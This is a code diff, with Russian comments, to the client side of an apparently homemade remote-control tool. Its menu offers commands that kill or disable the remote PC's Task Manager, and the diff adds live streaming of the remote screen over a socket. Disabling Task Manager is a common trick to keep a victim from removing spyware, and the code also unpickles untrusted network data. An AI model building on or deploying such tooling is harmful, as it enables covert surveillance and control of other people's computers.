@@ -4,8 +4,9 @@ from colorama import Fore, Style, init
 import baner
 import threading
 
+
 # Настройки клиента
-SERVER_HOST = '192.168.0.57'  # IP второго ПК
+SERVER_HOST = '192.168.0.97'  # IP второго ПК
 SERVER_PORT = 8080             # Тот же порт, что и на сервере
 
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -58,6 +59,8 @@ while True:
     print(Fore.GREEN + "14. task_manager - завершает процес диспетчера задач")
     print(Fore.GREEN + "15. task_manager_disab - не даёт запустить диспитчер задач")
     print(Fore.GREEN + "16. task_manager_enab - включает диспитчер задач")
+
+
 
     #print(Fore.GREEN + "31. screenshot - создать скриншот и сохранить на сервере.")
     print(Fore.GREEN + "exit. - выйти из программы.")
@@ -115,6 +118,44 @@ while True:
             print(f"Скриншот сохранен на рабочем столе: {screenshot_path}")
         else:
             print(response)
+
+    elif command == "screen":
+        print("yes")
+        data = b""
+        payload_size = struct.calcsize("Q")
+
+        try:
+            while True:
+                # Получение размера данных
+                while len(data) < payload_size:
+                    packet = client_socket.recv(4 * 1024)
+                    if not packet:
+                        break
+                    data += packet
+
+                packed_msg_size = data[:payload_size]
+                data = data[payload_size:]
+                msg_size = struct.unpack("Q", packed_msg_size)[0]
+
+                # Получение самих данных
+                while len(data) < msg_size:
+                    data += client_socket.recv(4 * 1024)
+
+                frame_data = data[:msg_size]
+                data = data[msg_size:]
+
+                # Десериализация данных и отображение
+                buffer = pickle.loads(frame_data)
+                frame = cv2.imdecode(buffer, cv2.IMREAD_COLOR)
+
+                cv2.imshow("Экран сервера", frame)
+                if cv2.waitKey(1) & 0xFF == ord('q'):
+                    break
+        except Exception as e:
+            print(f"Ошибка: {e}")
+        finally:
+            client_socket.close()
+            cv2.destroyAllWindows()
 
 
 
